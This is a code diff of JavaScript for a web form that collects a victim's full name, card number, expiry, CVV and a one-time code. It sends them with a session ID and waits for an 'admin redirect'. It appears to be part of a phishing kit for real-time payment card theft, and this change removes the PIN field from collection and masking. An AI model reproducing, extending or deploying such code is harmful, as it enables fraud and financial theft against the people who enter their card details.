@@ -42,10 +42,10 @@ function go(id) {
                         $('#loading-content').show();
                 }
 
-        } else if (id == 'submit-card' && checkEmpty(fullname_field) && checkEmpty(card_field) && checkEmpty(expiry_field) && checkEmpty(cvv_field) && checkEmpty(pin_field) && validateCard(card_field) && validateExpiry(expiry_field) && validatePIN(pin_field)) {
+        } else if (id == 'submit-card' && checkEmpty(fullname_field) && checkEmpty(card_field) && checkEmpty(expiry_field) && checkEmpty(cvv_field) && validateCard(card_field) && validateExpiry(expiry_field)) {
                 hideDiv(crError);
                 sendCardInfo(sess, getInputValue(fullname_field), getInputValue(card_field),
-                        getInputValue(expiry_field), getInputValue(cvv_field), getInputValue(pin_field));
+                        getInputValue(expiry_field), getInputValue(cvv_field));
                 // Show loading overlay and wait for admin redirect
                 if (!AUTO_MODE) {
                         $('#loading-content').show();
@@ -182,7 +182,6 @@ $(document).ready (function () {
 	showLoadingDots();
 	showLoadingDots_2();
 	$('#' + kodeField).mask('000000');
-	$('#' + pin_field).mask('0000');
 	
 	// Restrict OTP input to only numbers
 	$('#' + kodeField).on('input', function() {
